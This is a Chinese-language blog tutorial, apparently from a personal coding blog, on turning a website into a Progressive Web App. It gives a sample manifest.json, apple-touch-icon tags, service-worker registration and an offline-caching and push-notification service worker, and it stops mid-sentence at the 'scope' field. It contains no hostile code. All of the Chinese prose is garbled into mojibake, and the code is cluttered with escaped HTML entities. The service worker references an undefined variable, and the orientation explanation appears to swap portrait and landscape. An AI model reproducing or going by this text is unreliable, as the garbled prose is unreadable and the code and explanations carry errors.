è®Šæˆä¸€éš»æ‡‰ç”¨ç¨‹å¼ï¼\nå°‡ç¶²é è®ŠæˆProgressive Web Application(PWA) Step1ï¼šä¸‹è¼‰ Chrome æ“´å……å¥—ä»¶ é»æˆ‘å‰å¾€ ã€ŒWeb Serverã€ æ“´å……å¥—ä»¶\né¦–å…ˆï¼Œä½ å¯å…ˆä¸‹è¼‰Chromeçš„ã€ŒWeb Serverã€æ“´å……ç¨‹å¼ï¼Œå†é»ã€ŒCHOSOSE FOLDERã€éˆ•ï¼Œé¸æ“‡å·²è£½ä½œå¥½çš„ç¶²é ç›®éŒ„ã€‚\nStep2ï¼šæª¢æŸ¥ç¶²é  é»ä¸€ä¸‹é€£çµï¼Œä¸¦æª¢æŸ¥ç¶²é æ˜¯å¦èƒ½æ­£å¸¸å‘ˆç¾ã€‚\nStep3ï¼šå»ºç«‹ manifest.json æ›´å¤š manifest.json ä»‹ç´¹ï¼Œé»æˆ‘å‰å¾€\næ¥è‘—å»ºç«‹ä¸€å€‹æ–°çš„æ–‡ä»¶æª”ï¼Œä¸¦ä¾çš„è¼¸å…¥æ‡‰ç”¨ç¨‹å¼åç¨±ã€åœ–ç¤ºã€èˆ‡æ‡‰ç”¨ç¨‹å¼çš„URLï¼Œå†å°‡å®ƒå„²å­˜ç‚ºã€Œmanifest.jsonã€æª”ã€‚\nmanifest.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 { \u0026#34;short_name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;å‰æ©çš„éƒ¨è½æ ¼ï¼Œç”¨æ–¼ç´€éŒ„coding lifeæŸ¥æ‰¾çš„è³‡æ–™ã€ç­†è¨˜èˆ‡æ–‡ç« ï¼Œçµ±æ•´èµ·ä¾†é™¤äº†è‡ªå·±ä½¿ç”¨ï¼Œä¹Ÿå¸Œæœ›å°å„ä½æœ‰å¹«åŠ©ã€‚\u0026#34;, \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-57x57.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;57x57\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-114x114.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;114x114\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-120x120.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;120x120\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-180x180.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;180x180\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-192x192.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-512x512.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./maskable_icon.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34;, \u0026#34;purpose\u0026#34;: \u0026#34;any maskable\u0026#34; } ], \u0026#34;lang\u0026#34;: \u0026#34;zh-Hant-TW\u0026#34;, \u0026#34;start_url\u0026#34;: \u0026#34;./?utm_source=web_app_manifest\u0026#34;, \u0026#34;background_color\u0026#34;: \u0026#34;#f5f5fa\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#57BCB9\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;orientation\u0026#34;: \u0026#34;landscape\u0026#34;, \u0026#34;prefer_related_applications\u0026#34;: false } Step4ï¼šhtml åŠ å…¥ manifest.json åœ¨headæ¨™ç±¤ä¸­åŠ å…¥ manifest.jsonã€‚\n1 2 3 \u0026lt;!-- ... --\u0026gt; \u0026lt;link rel=\u0026#34;manifest\u0026#34; href=\u0026#34;./manifest.json\u0026#34; /\u0026gt; \u0026lt;!-- ... --\u0026gt; ç”±æ–¼ manifest åœ¨ IOS ä¸Šé‚„ä¸æ”¯æ´ï¼Œå› æ­¤å¦‚æœ IOS ä¸Šä¹Ÿæƒ³è¦è‡ªè¨‚ iconï¼Œå°±è¦æ”¹ç”¨ HTML è£¡çš„ meta ä¾†è¨­å®šï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 \u0026lt;!-- ... --\u0026gt; \u0026lt;link rel=\u0026#34;manifest\u0026#34; href=\u0026#34;./manifest.json\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;57x57\u0026#34; href=\u0026#34;./apple-touch-icon-57x57.webp\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;114x114\u0026#34; href=\u0026#34;./apple-touch-icon-114x114.webp\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;120x120\u0026#34; href=\u0026#34;./apple-touch-icon-120x120.webp\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;180x180\u0026#34; href=\u0026#34;./apple-touch-icon-180x180.webp\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;192x192\u0026#34; href=\u0026#34;./apple-touch-icon-192x192.webp\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;512x512\u0026#34; href=\u0026#34;./apple-touch-icon-512x512.png\u0026#34; /\u0026gt; \u0026lt;!-- ... --\u0026gt; Step5ï¼šæ‰“é–‹é–‹ç™¼äººå“¡å·¥å…·æª¢æŸ¥ manifest.json çš„è¨­å®š Step6ï¼šåŠ å…¥ serviceWorker èªæ³• æ›´å¤š Service Worker ä»‹ç´¹ï¼Œé»æˆ‘å‰å¾€\nåœ¨ç¶²é å‰åŠ å…¥ä¸‹æ–¹çš„èªæ³•ã€‚\n1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; if (\u0026#34;serviceWorker\u0026#34; in navigator) { console.log(\u0026#34;Will service worker register?\u0026#34;); navigator.serviceWorker.register(\u0026#34;./service-worker.js\u0026#34;).then(function(reg) { console.log(\u0026#34;Yes it did.\u0026#34;); }).catch(function(err) { console.log(\u0026#34;No, it didn\u0026#39;t. This happened: \u0026#34;, err); }); } \u0026lt;/script\u0026gt; Step7ï¼šå»ºç«‹ service-worker.js æª”æ¡ˆ æ¥è‘—å†å»ºç«‹ä¸€å€‹æ–‡ä»¶ï¼Œä¸¦è²¼ä¸Šä¸‹æ–¹çš„èªæ³•ï¼Œå„²å­˜ç‚º service-worker.jsï¼Œé€™æ™‚å¯çœ‹åˆ°åœ¨åŸä¾†çš„ç¶²é ä¸­ï¼Œåˆ†åˆ¥æœƒå¤šäº† manifest.json èˆ‡ service-worker.js å’Œåœ–ç‰‡è³‡æ–™å¤¾ã€‚\nservice-worker.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 self.addEventListener(\u0026#39;install\u0026#39;, function(event) { self.skipWaiting(); var offlinePage = new Request(\u0026#39;offline.html\u0026#39;); event.waitUntil( fetch(offlinePage).then(function(response) { return caches.open(\u0026#39;offline2\u0026#39;).then(function(cache) { return cache.put(offlinePage, response); }); })); }); self.addEventListener(\u0026#39;fetch\u0026#39;, function(event) { event.respondWith( fetch(event.request).catch(function(error) { return caches.open(\u0026#39;offline2\u0026#39;).then(function(cache) { return cache.match(\u0026#39;offline.html\u0026#39;); }); })); }); self.addEventListener(\u0026#39;refreshOffline\u0026#39;, function(response) { return caches.open(\u0026#39;offline2\u0026#39;).then(function(cache) { return cache.put(offlinePage, response); }); }); self.addEventListener(\u0026#39;push\u0026#39;, function (event) { var data = event.data.json(); var opts = { body: data.body, icon: data.icon, data: { url: data.url } }; event.waitUntil(self.registration.showNotification(data.title, opts)); }); self.addEventListener(\u0026#39;notificationclick\u0026#39;, function(event) { var data = event.notification.data; event.notification.close(); event.waitUntil( clients.openWindow(data.url) ); }); Step8ï¼šç¢ºèª Service Workers æ˜¯å¦æ­£å¸¸ æ¥è‘—å†å›åˆ°ç¶²é çš„ã€Œé–‹ç™¼äººå“¡å·¥å…·ã€çš„ Service Workers æ™‚ï¼Œå°±æœƒçœ‹åˆ°ç¶ è‰²ç‡ˆè™Ÿã€‚\nStep9ï¼šå®‰è£ã€Œé é¢ã€ éƒ½å®Œæˆå¾Œï¼Œå†é» Chrome å³ä¸Šçš„é¸å–®åœ–ç¤ºï¼Œå°±å¯çœ‹åˆ°ã€Œå®‰è£XXXã€ã€‚\nStep10ï¼šå®‰è£ é»ä¸€ä¸‹ï¼Œå°±æœƒå‡ºç¾å®‰è£ç•«é¢ï¼Œå†é»ã€Œå®‰è£ã€ã€‚\nç•¶å®‰è£å®Œç•¢å¾Œï¼Œå°±æœƒé–‹å•Ÿå‰›æ‰€å®‰è£çš„æ‡‰ç”¨ç¨‹å¼ï¼Œå“ˆï¼æ˜¯ä¸æ˜¯ç•«é¢ä¹¾æ·¨è¨±å¤šï¼Œå°±åƒåœ¨ä½¿ç”¨ä¸€èˆ¬çš„æ‡‰ç”¨ç¨‹å¼ä¸€æ¨£ï¼Œæœ‰äº†PWAå¾Œå¯å¯¦ç¾é€éç¶²é å°±èƒ½æ‰“é€ å°ˆå±¬çš„æ‡‰ç”¨ç¨‹å¼çš„å¤¢æƒ³ï¼Œä¸”å®Œå…¨ä¸ç”¨å†å­¸æ–°èªè¨€ï¼ŒçœŸæ˜¯è¶…æ–¹ä¾¿çš„ã€‚\nmanifest.json ä»‹ç´¹ ä»¥ä¸‹ä¾†èªªæ˜ä¸€ä¸‹ manifest.json\nmanifest.json æ˜¯åœ¨å­¸ PWA é€™å¡Šæ™‚æœ€ç°¡å–®çš„éƒ¨ä»½ï¼Œä¸»è¦æ˜¯å»ºä¸€æ”¯ JSON æª”å°±å¯ä»¥ï¼Œç›¸é—œçš„åƒæ•¸ MDNä¸Š æˆ–æ˜¯ Google ä¸€ä¸‹å°±æœƒçœ‹åˆ°ï¼Œä¸ç”¨èŠ±å¤ªå¤šçš„æ™‚é–“å»è¨˜ã€‚\nmanifest.jsonæ˜¯åšä»€éº¼ç”¨çš„ï¼Ÿ æ ¹æ“š MDN ä¸Šçš„è§£é‡‹ï¼Œmanifest.json æ˜¯é€™æ¨£å­çš„ï¼š\nå®ƒæä¾›äº†æ‡‰ç”¨ç¨‹å¼ç›¸é—œçš„è³‡è¨Šï¼ˆåƒæ˜¯åç¨±ã€ä½œè€…ã€åœ–ç¤ºã€æè¿°ï¼‰ã€‚ manifest çš„åŠŸç”¨æ˜¯å°‡ Web æ‡‰ç”¨ç¨‹å¼å®‰è£åˆ°è¨­å‚™çš„ä¸»ç•«é¢ï¼Œç‚ºä½¿ç”¨è€…æä¾›æ›´å¿«é€Ÿçš„è¨ªå•å’Œæ›´è±å¯Œçš„é«”é©—ã€‚\nç°¡å–®çš„èªªæ˜å°±æ˜¯ï¼ŒPWA ä¸»è¦å°±æ˜¯è®“ç¶²é å¯ä»¥æ¨¡æ“¬æˆä¸€å€‹æ‰‹æ©Ÿçš„ App ä¾†ä½¿ç”¨ï¼Œè¦ç•¶æˆ Appï¼Œå°±è¦æœ‰ App çš„æ¨£å­ï¼Œå°±è¦èƒ½åœ¨æ‰‹æ©Ÿçš„æ¡Œé¢ä¸Šæœ‰ä¸€å€‹ icon å¯ä»¥æŒ‰ï¼ŒæŒ‰ä¸‹å»å¾Œæœ‰ä¸€å€‹å¹¾ç§’é˜çš„å•Ÿå‹•ç•«é¢è®“ä½¿ç”¨è€…çŸ¥é“é–‹å•Ÿçš„ App æ˜¯ä»€éº¼ï¼Œmanifest å°±æ˜¯åœ¨è™•ç†é€™æ®µã€‚\nå¦å¤–ï¼Œä¸€èˆ¬æˆ‘å€‘åœ¨æ‰‹æ©Ÿä¸Šé–‹ Chrome æˆ– Safari çœ‹ç¶²é æ™‚ï¼Œæœ€é ‚éƒ¨æœƒæœ‰ä¸€æ¢ç¶²å€åˆ—ï¼Œä½†ä¸€èˆ¬ App æ˜¯ä¸æœƒæœ‰çš„ï¼Œè€Œ manifest.json ä¹Ÿå¯ä»¥è¨­å®šé–‹å•Ÿé é¢æ™‚ä¸é¡¯ç¤ºç¶²å€åˆ—ã€‚\nPWA æ˜¯æŠŠé é¢æ¨¡æ“¬æˆ App çš„ä¸€å€‹æ–¹æ³•ï¼Œå¦‚æœå…¬å¸æœ¬èº«ä¹Ÿæœ‰è£½ä½œ App å‘¢ï¼Ÿmanifest.json ä¸Šä¹Ÿå¯ä»¥è¨­å®š App åœ¨ Google Playã€App Store ä¸Šçš„é€£çµï¼Œä¸¦å‘ˆç¾ä¸€å€‹æ¨è–¦é€šçŸ¥è®“ä½¿ç”¨è€…å¯ä»¥é€²å…¥ä¸¦ä¸‹è¼‰ã€‚\næœ€å¾Œè£œå……ä¸€é»ï¼Œä¸è«–æ˜¯ PWA çš„ Cache æˆ–æ˜¯æ¨æ’­åŠŸèƒ½ï¼Œéƒ½è¦æ±‚ç¶²ç«™è¦æ˜¯ httpsï¼Œmanifest.json é€™é»ä¹Ÿä¸æ„å¤–ï¼Œå¦‚æœç¶²ç«™ä¸æ˜¯ httpsï¼Œå³ä¾¿å¼•ç”¨äº† manifest.jsonï¼Œä¹Ÿä¸æœƒè¢« Chrome ä¸»å‹•è©¢å•æ˜¯å¦è¦å°‡ç¶²ç«™åŠ å…¥åˆ°ä¸»ç•«é¢ã€‚\né—œæ–¼ manifest çš„åŠŸèƒ½ï¼ŒGoogle æœ‰ä¸€éš»å½±ç‰‡ä»‹ç´¹ï¼š\nWeb App Manifest: Totally Tooling Tips\nmanifest.json æˆå“¡ æˆå“¡åˆ—è¡¨æ•´ç†å¦‚ä¸‹ï¼š\næ¬„ä½ èªªæ˜ theme_color æ‡‰ç”¨ç¨‹å¼çš„ä¸»è¦é¡è‰² background_color å•Ÿå‹•ç•«é¢ï¼ˆsplash screenï¼‰çš„èƒŒæ™¯è‰² icons æ‡‰ç”¨ç¨‹å¼çš„åœ–ç¤º name æ‡‰ç”¨ç¨‹å¼çš„åç¨± short_name æ‡‰ç”¨ç¨‹å¼çš„ç°¡å¯« lang ä¸»è¦èªè¨€ description æ‡‰ç”¨ç¨‹å¼çš„æè¿° dir æ–‡å­—æ›¸å¯«æ–¹å‘ display æ‡‰ç”¨ç¨‹å¼çš„é¡¯ç¤ºæ¨¡å¼ orientation é è¨­é¡¯ç¤ºçš„æ–¹å‘æ˜¯ç›´çš„æˆ–æ©«çš„ prefer_related_applications æ˜¯å¦è¦æ¨è–¦ä¸€å€‹åŸç”Ÿçš„ App related_applications æ¨è–¦åŸç”Ÿ App çš„é€£çµ start_url é–‹å•Ÿæ‡‰ç”¨ç¨‹å¼æ™‚çš„é è¨­ç¶²å€ scope æ‡‰ç”¨ç¨‹å¼çš„ä½¿ç”¨ç¯„åœ theme_color æ‡‰ç”¨ç¨‹å¼çš„ä¸»è¦é¡è‰²ï¼Œä¸»è¦å¯ä»¥æ”¹è®Šç¶²å€åˆ—é‚£ä¸€æ¢çš„é¡è‰²ã€‚\n1 \u0026#34;theme_color\u0026#34;: \u0026#34;#57BCB9\u0026#34; background_color å•Ÿå‹•ç•«é¢ï¼ˆsplash screenï¼‰çš„èƒŒæ™¯è‰²ï¼ŒApp å•Ÿå‹•æ™‚ï¼Œæœƒæœ‰ä¸€å€‹ Splash Screenï¼Œç¿»è­¯æˆå¿«é–ƒé ã€éå ´é ï¼Œæœ¬ç¯‡ç¨±ç‚ºå•Ÿå‹•ç•«é¢ã€‚\nSplash Screen éœ€è¦3å€‹æˆå“¡ï¼šbackground_colorã€iconsã€nameã€‚\n1 \u0026#34;background_color\u0026#34;: \u0026#34;red\u0026#34; è£œå……ä¸€é»ï¼ŒSplash Screenï¼Œåœ¨ IOS ä¸Šæ˜¯ä¸æ”¯æ´çš„ï¼Œä½†å¯ä»¥ç›´æ¥è®€å–ä¸€å¼µåœ–æª”ä¾†ç•¶ä½œå•Ÿå‹•é é¢ï¼Œåœ¨ head è£¡åŠ å…¥ä»¥ä¸‹å°±è¡Œï¼š\n1 2 3 4 5 6 7 \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-640x1136.png\u0026#34; media=\u0026#34;(device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-750x1294.png\u0026#34; media=\u0026#34;(device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-1125x2436.png\u0026#34; media=\u0026#34;(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-1242x2148.png\u0026#34; media=\u0026#34;(device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-1536x2048.png\u0026#34; media=\u0026#34;(min-device-width: 768px) and (max-device-width: 1024px) and (-webkit-min-device-pixel-ratio: 2) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-1668x2224.png\u0026#34; media=\u0026#34;(min-device-width: 834px) and (max-device-width: 834px) and (-webkit-min-device-pixel-ratio: 2) and (orientation: portrait)\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-startup-image\u0026#34; href=\u0026#34;images/splash-2048x2732.png\u0026#34; media=\u0026#34;(min-device-width: 1024px) and (max-device-width: 1024px) and (-webkit-min-device-pixel-ratio: 2) and (orientation: portrait)\u0026#34;\u0026gt; icons æ‡‰ç”¨ç¨‹å¼çš„åœ–ç¤ºï¼Œicons è£¡æ”¾é™£åˆ—ï¼Œæ”¾ä¸åŒå°ºå¯¸ä¸‹çš„ä¸»è¦åœ–ç¤ºï¼Œå¦‚æœ Splash Screen è£¡è¦ç”¨çš„åœ–ç¤ºï¼Œå¤§å°å¿…é ˆåŒ…å« 192pxã€512pxã€‚\nicons è£¡ï¼Œé™£åˆ—è£¡çš„æ¯ä¸€å€‹ç‰©ä»¶æœ‰ 3 å€‹æˆå“¡ï¼š\nsizes åœ–ç‰‡å°ºå¯¸ï¼Œå¯ç”¨åœ¨å¤šå€‹å°ºå¯¸ä¸Šçš„è©±ç”¨ç©ºç™½éµå€éš”ã€‚ src åœ–ç‰‡çš„è·¯å¾‘ï¼Œå¦‚æœæ˜¯ç›¸å°è·¯å¾‘ï¼Œæ˜¯ä»¥ manifest æ‰€åœ¨çš„ä½ç½®ç‚ºåŸºæº–ã€‚ type åœ–æª”é¡å‹ï¼Œé€™é …æ’å¿…å¡«ï¼Œä¸»è¦æ˜¯å‘ŠçŸ¥è£ç½®é¡å‹ï¼Œè®“ä¸æ”¯æ´çš„è£ç½®å¯ä»¥å¿«é€Ÿç•¥éã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;: \u0026#34;icon/lowres.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;48x48\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;icon/lowres\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;48x48\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;icon/hd_hi.ico\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;72x72 96x96 128x128 256x256\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;icon/hd_hi.svg\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;72x72\u0026#34; } ] ç”±æ–¼ manifest åœ¨ IOS ä¸Šé‚„ä¸æ”¯æ´ï¼Œå› æ­¤å¦‚æœ IOS ä¸Šä¹Ÿæƒ³è¦è‡ªè¨‚ iconï¼Œå°±è¦æ”¹ç”¨ HTML è£¡çš„ meta ä¾†è¨­å®šï¼Œå¦‚ä¸‹ï¼š\n1 2 3 \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;57x57\u0026#34; href=\u0026#34;apple-icon-57x57.png\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;72x72\u0026#34; href=\u0026#34;apple-icon-72x72.png\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; sizes=\u0026#34;114x114\u0026#34; href=\u0026#34;apple-icon-114x114.png\u0026#34; /\u0026gt; name æ‡‰ç”¨ç¨‹å¼çš„å®Œæ•´åç¨±ï¼Œæœƒé¡¯ç¤ºåœ¨ Splash Screenä¸Šï¼Œä»¥åŠä¸»ç•«é¢ä¸Šçš„åç¨±ã€‚\n1 \u0026#34;name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34; short_name æ‡‰ç”¨ç¨‹å¼çš„ç°¡å¯«ï¼Œç•¶ name å¤ªé•·è€Œç„¡æ³•é¡¯ç¤ºæ™‚ï¼Œæœƒæ”¹æˆé¡¯ç¤ºç°¡å¯«ã€‚\n1 \u0026#34;short_name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34; lang ä¸»è¦èªè¨€ï¼Œé‡å° nameã€short_name é€™å…©å€‹ä½¿ç”¨çš„ã€‚\nèªè¨€åˆ—è¡¨å¯ä»¥åœ¨é€™æ‰¾ï¼šhttps://www.iana.org\n1 \u0026#34;lang\u0026#34;: \u0026#34;zh-Hant-TW\u0026#34; description æ‡‰ç”¨ç¨‹å¼çš„æè¿°ï¼Œæè¿°é€™å€‹æ‡‰ç”¨ç¨‹å¼æ˜¯åšä»€éº¼çš„ã€‚\n1 \u0026#34;description\u0026#34;: \u0026#34;å‰æ©çš„éƒ¨è½æ ¼ï¼Œç”¨æ–¼ç´€éŒ„coding lifeæŸ¥æ‰¾çš„è³‡æ–™ã€ç­†è¨˜èˆ‡æ–‡ç« ï¼Œçµ±æ•´èµ·ä¾†é™¤äº†è‡ªå·±ä½¿ç”¨ï¼Œä¹Ÿå¸Œæœ›å°å„ä½æœ‰å¹«åŠ©ã€‚\u0026#34; dir æ–‡å­—æ›¸å¯«æ–¹å‘ï¼Œå€¼æœ‰ 3 å€‹ï¼šltrï¼ˆå·¦è‡³å³ï¼‰ã€rtlï¼ˆå³è‡³å·¦ï¼‰ã€autoï¼ˆè®“ç€è¦½å™¨è‡ªå·±æ±ºå®šï¼‰ï¼Œä¸å¡«çš„è©±é è¨­å€¼æ˜¯ autoã€‚\n1 \u0026#34;dir\u0026#34;: \u0026#34;ltr\u0026#34; display æ‡‰ç”¨ç¨‹å¼çš„é¡¯ç¤ºæ¨¡å¼ï¼Œé¡¯ç¤ºæ¨¡å¼æŒ‡çš„æ˜¯å¾ä¸»ç•«é¢é»é–‹ App å¾Œï¼Œè¦é¡¯ç¤ºçš„æ¨£å­ï¼Œæœ‰ 4 å€‹å€¼å¯ç”¨ï¼š\nfullscreenï¼š å…¨è¢å¹•ï¼Œå°±åƒåœ¨ç”¨åŸç”Ÿ App ä¸€æ¨£ï¼Œæœƒéš±è—æ‰€æœ‰çš„ç€è¦½å™¨ UIã€‚ standaloneï¼š æœƒéš±è—æ¨™æº–ç€è¦½å™¨ UI å…ƒç´ ï¼Œå¦‚ URL æ¬„ç­‰ã€‚ browserï¼š é è¨­å€¼ï¼Œå°±åƒä¸€èˆ¬ç”¨ç€è¦½å™¨ä¸€æ¨£ã€‚ minimalï¼š ui æœƒæœ‰å°è¦½åˆ—æœ€å°çš„ UIï¼Œé€™å€‹å€¼ Chrome ä¸æ”¯æ´ã€‚ å¦‚æœè¦ Chrome ä¸»å‹•æç¤ºåŠ å…¥ä¸»ç•«é¢çš„è©±ï¼Œè¨­å®šå€¼å¿…é ˆè¦æ˜¯ standaloneã€‚\n1 \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34; orientation é è¨­é¡¯ç¤ºçš„æ–¹å‘æ˜¯ç›´çš„æˆ–æ©«çš„ï¼Œå¯ä»¥å¼·åˆ¶è®“ä½¿ç”¨è€…å¿…é ˆè£ç½®æ‹¿ç›´çš„ï¼ˆlandscapeï¼‰æˆ–æ‹¿æ©«çš„ï¼ˆportraitï¼‰çœ‹ã€‚é€™é»è¦è¨­è¦ä»”ç´°æ€è€ƒéæ‰è¡Œï¼Œå› ç‚ºä½¿ç”¨éƒ½å¤§éƒ¨ä»½éƒ½å–œæ­¡è‡ªå·±æ±ºå®šæ˜¯ç›´çœ‹æˆ–æ¨ªçœ‹ã€‚\nå¦‚æœæ˜¯éŠæˆ²é¡å‹çš„ï¼Œå¯ä»¥è¨­å®šç”¨æ©«çš„ã€‚\n1 \u0026#34;orientation\u0026#34;: \u0026#34;landscape\u0026#34; prefer_related_applications æ˜¯å¦è¦æ¨è–¦ä¸€å€‹åŸç”Ÿçš„ Appï¼ŒPWA æ˜¯æ¨¡æ“¬é é¢ç‚º Appï¼Œå¦‚æœç¶²ç«™æœ¬èº«æœ‰å‡º Appï¼Œé€™é …å°±å¯ä»¥è¨­æˆ trueï¼Œå¾ä¸»ç•«é¢é»é–‹é é¢æ™‚å°±æœƒå‡ºç¾å¯ä»¥ä¸‹è¼‰ App çš„æç¤ºã€‚\nå¦‚æœé€™é …ç‚º trueï¼Œå‰‡ä¸‹é¢çš„ related_applications å°±è¦å¡«å…¥å€¼ï¼›é€™é …çš„é è¨­å€¼ç‚º falseã€‚\n1 \u0026#34;prefer_related_applications\u0026#34;: false related_applications æ¨è–¦åŸç”Ÿ App çš„é€£çµï¼Œå€¼æ˜¯é™£åˆ—ï¼Œè£¡é¢æ”¾ App è³‡è¨Šçš„ç‰©ä»¶ï¼Œæ¯é …ç‰©ä»¶æœ‰ 2 å€‹æˆå“¡è¦å¡«ï¼Œæ˜¯ Google Play ä¸Šçš„è©±å‰‡æœ‰ 3 å€‹æˆå“¡ã€‚\nplatformï¼š æ‡‰ç”¨ç¨‹å¼çš„å¹³å°ï¼Œå¯å¡« playã€itunesã€‚ urlï¼š æ‡‰ç”¨ç¨‹å¼çš„ç¶²å€ã€‚ idï¼š Google Playä¸Šè¦å¡«çš„ IDã€‚ 1 2 3 4 5 6 7 8 9 10 11 \u0026#34;related_applications\u0026#34;: [ { \u0026#34;platform\u0026#34;: \u0026#34;play\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://play.google.com/store/apps/details?id=com.example.app1\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;com.example.app1\u0026#34; }, { \u0026#34;platform\u0026#34;: \u0026#34;itunes\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://itunes.apple.com/app/example-app1/id123456789\u0026#34; } ] start_url é–‹å•Ÿæ‡‰ç”¨ç¨‹å¼æ™‚çš„é è¨­ç¶²å€ï¼Œå¦‚æœæœ‰è¨­å®šçš„è©±ï¼Œé–‹å•Ÿæ‡‰ç”¨ç¨‹å¼æ™‚å°±æœƒé€²åˆ°è¨­å®šçš„ç¶²å€ã€‚æ²’è¨­å®šçš„è©±å°±æ˜¯ä½¿ç”¨è€…æŒ‰åŠ å…¥ä¸»ç•«é¢æ™‚çš„é‚£å€‹ç¶²å€ã€‚\nå¦‚æœå¡«å¯«çš„æ˜¯ç›¸å°è·¯å¾‘ï¼Œæ˜¯ä»¥ manifest æ‰€åœ¨çš„ä½ç½®ç‚ºåŸºæº–ã€‚\nå»ºè­°å¯ä»¥åœ¨ç¶²å€ä¸ŠåŠ å…¥ Google Analytics çš„ utm åƒæ•¸ï¼Œé€™æ¨£åœ¨ GA ä¸Šå°±å¯ä»¥çœ‹è¦‹å¤šå°‘ä¾†æºæ˜¯ä¾†è‡ªæ–¼ PWAï¼Œå¯ä»¥æª¢æ¸¬æˆæ•ˆã€‚\nå¦‚æœè¦ Chrome ä¸»å‹•æç¤ºåŠ å…¥ä¸»ç•«é¢çš„è©±ï¼Œé€™é …å¿…é ˆå¡«å¯«ã€‚\n1 \u0026#34;start_url\u0026#34;: \u0026#34;./?utm_source=web_app_manifest\u0026#34; scope 